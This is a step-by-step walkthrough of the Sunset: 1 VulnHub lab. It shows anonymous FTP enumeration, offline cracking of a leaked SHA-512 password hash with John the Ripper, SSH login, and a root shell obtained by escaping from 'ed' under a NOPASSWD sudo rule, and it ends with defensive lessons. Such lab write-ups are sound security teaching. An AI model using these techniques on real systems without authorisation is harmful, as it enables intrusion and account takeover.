# Sunset: 1 — Beginner VulnHub Walkthrough

This is a step-by-step, beginner-friendly walkthrough of the **Sunset: 1** boot2root
challenge from VulnHub. Every command is explained, and every output is shown as you
would actually see it. If a line ever looks slightly different on your machine, do not
worry — small details **vary by build**.

| Field | Value |
|---|---|
| **Machine** | Sunset: 1 |
| **Difficulty** | Beginner |
| **Author** | whitecr0wz |
| **Released** | 29 July 2019 |
| **VulnHub Entry** | https://vulnhub.com/entry/sunset-1,339/ |
| **Download** | https://vulnhub.com/entry/sunset-1,339/#download |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Debian Linux 10 (Buster) |

> **Why it works:** This box is deliberately simple. It chains three classic beginner
> techniques: an anonymous FTP server leaking a password hash, offline hash cracking,
> and a misconfigured `sudo` rule that lets a normal user run a text editor as root.

---

## 0. What you will learn

By the end of this walkthrough you will have practised:

- **Host discovery** — finding the target's IP address on your lab network.
- **Port scanning with Nmap** — discovering which network services are listening.
- **Anonymous FTP enumeration** — logging into an FTP server with no credentials.
- **Password hash cracking** — using John the Ripper to recover a weak password.
- **SSH access** — logging into a Linux machine with recovered credentials.
- **Privilege escalation via `sudo`** — abusing an allowed binary (`ed`) to obtain root.

You do **not** need any prior hacking experience. Copy the commands, read the outputs,
and try to understand *why* each step works.

---

## 1. Reconnaissance — finding the target

Both the Kali attacker machine and the Sunset target are on the same isolated host-only
network. We know the attacker is `192.168.56.10`. We need to find the target.

First, confirm your own IP address:

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Now discover live hosts on the subnet with `arp-scan`:

```bash
sudo arp-scan --localnet
```

```text
192.168.56.1     0a:00:27:00:00:00  (Unknown)
192.168.56.10    0a:00:27:00:00:09  (Unknown)
192.168.56.101   08:00:27:8b:4d:1a  (Unknown)
```

> **Why it works:** `arp-scan` sends ARP requests to every address in the local subnet.
> Any machine that replies is alive and reachable. The target is `192.168.56.101`.

An alternative is `netdiscover`, which does the same job passively/actively:

```bash
sudo netdiscover -r 192.168.56.0/24
```

![Finding the target IP with arp-scan](images/01-arp-scan.png)

---

## 2. Enumeration

Now that we have the IP, we find out which services are running.

### 2.1 Nmap service scan

```bash
nmap -sC -sV -p- 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.56.101
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root  root  1062 Jul 29  2019 backup
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:** `-sC` runs default NSE scripts (which is how we learned anonymous FTP
> is allowed), `-sV` fingerprints service versions, and `-p-` scans all 65,535 TCP ports
> so nothing hides on a high port. Here only **21 (FTP)** and **22 (SSH)** are open.

### 2.2 Anonymous FTP login

The scan told us anonymous FTP is enabled, so we log in anonymously.

```bash
ftp 192.168.56.101
```

```text
Connected to 192.168.56.101.
220 pyftpdlib 1.5.5 ready.
Name (192.168.56.101:kali): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
-rw-r--r--   1 root  root   1062 Jul 29  2019 backup
ftp> get backup
226 Transfer complete.
1062 bytes received in 0.001 secs
ftp> exit
```

> **Why it works:** A misconfigured FTP server allows the `anonymous` account, meaning
> anyone on the network can read (and sometimes write) files without a real password.

![Anonymous FTP login and download](images/02-ftp-anon.png)

---

## 3. Foothold

### 3.1 Read the leaked backup file

```bash
cat backup
```

```text
CREDENTIALS

sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/...
space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU...
```

> **Why it works:** This file leaks usernames with their **SHA-512 crypt** password
> hashes (the `$6$` prefix means SHA-512-crypt). Hashes cannot be "decrypted", but weak
> passwords can be guessed one at a time against a wordlist — that is cracking.

### 3.2 Crack the hash with John the Ripper

Put the `sunset` line into its own file:

```bash
echo 'sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/' > sunset.hash
```

Then run John using the famous `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt sunset.hash
```

```text
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
cheer14          (sunset)
1g 0:00:00:12 DONE
Session completed.
```

> **Why it works:** John takes each word from `rockyou.txt`, hashes it with the same salt
> found in the file, and compares. When the hashes match, the password is revealed —
> here `sunset:cheer14`.

### 3.3 Log in over SSH

```bash
ssh sunset@192.168.56.101
```

```text
sunset@192.168.56.101's password: cheer14
Linux sunset 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 x86_64
sunset@sunset:~$
```

We now have a shell. Grab the user flag:

```bash
ls
cat user.txt
```

```text
5b5b8e9b01ef27a1cc0a2d5fa87d7190
```

![SSH login and user flag](images/03-ssh-user-flag.png)

---

## 4. Privilege escalation

We are the low-privileged `sunset` user and want `root`.

### 4.1 Check what we are allowed to run with sudo

```bash
sudo -l
```

```text
Matching Defaults entries for sunset on sunset:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:...

User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed
```

> **Why it works:** `sudo -l` lists commands this user may run as another user. We can
> run the editor **`ed`** as **root**, and `NOPASSWD` means no password is even needed.

### 4.2 Exploit `ed` to get a root shell

`ed` is a line-based text editor. Like many editors, it can run shell commands from
inside the editor using `!`. Because it was launched with `sudo`, the shell it spawns is
**root**.

```bash
sudo ed
```

```text
!/bin/sh
# whoami
root
```

> **Why it works:** When `ed` (running as root) executes `!/bin/sh`, the shell it starts
> inherits root's privileges. This "editor escape" trick is documented on GTFOBins.
> Any `sudo`-allowed program that can spawn a shell is a privilege-escalation risk.

### 4.3 Read the root flag

```bash
cd /root
ls
cat flag.txt
```

```text
25d7ce0ee3cbf71efbac61f85d0c14fe
```

![Root shell and root flag](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Why it is dangerous |
|---|---|---|---|
| 1 | Anonymous FTP enabled | Port 21 (pyftpdlib) | Lets anyone read files without credentials |
| 2 | Plaintext-readable hash backup | `backup` file | Exposes password hashes that can be cracked offline |
| 3 | Weak password | `sunset:cheer14` | Cracked quickly from a common wordlist |
| 4 | Over-permissive sudo rule | `(root) NOPASSWD: /usr/bin/ed` | An editor can spawn a root shell |

---

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP.** If an FTP server is truly required, require authenticated
  accounts, and prefer SFTP/SSH instead of plain FTP.
- **Never store password material on disk unprotected.** Backup files containing hashes
  should be encrypted, access-controlled, and never placed in world-readable locations.
- **Enforce strong passwords.** `cheer14` fell to `rockyou.txt` in seconds. Use length,
  complexity, and check new passwords against breached-password lists.
- **Apply the principle of least privilege to `sudo`.** Do not allow text editors,
  pagers, or interpreters (like `ed`, `vi`, `less`, `python`) to run as root. Audit with
  `sudo -l` for every account and remove unnecessary entries.
- **Use a unique salt and modern KDF.** SHA-512-crypt is fast and crackable; Argon2id or
  bcrypt with a high cost factor is far more resistant to offline cracking.

---

## 7. References

- VulnHub — Sunset: 1 entry: https://vulnhub.com/entry/sunset-1,339/
- GTFOBins — `ed`: https://gtfobins.github.io/gtfobins/ed/
- John the Ripper official site: https://www.openwall.com/john/
- OWASP — Password Storage Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- Nmap documentation: https://nmap.org/book/man.html

---

## 8. Screenshot checklist

Capture these screens as you go so your writeup is complete:

- [ ] `images/01-arp-scan.png` — `arp-scan`/`netdiscover` showing `192.168.56.101`
- [ ] `images/02-ftp-anon.png` — anonymous FTP login and `get backup`
- [ ] `images/03-ssh-user-flag.png` — SSH login plus `cat user.txt`
- [ ] `images/04-root-flag.png` — root shell (`whoami`) plus `cat /root/flag.txt`
- [ ] `images/05-sudo-l.png` — output of `sudo -l` showing the `ed` rule
- [ ] `images/06-proof.png` — a final combined proof screenshot

> **Why it works:** A complete screenshot trail proves reproducibility and helps others
> follow along — a habit that matters for real penetration-test reports.
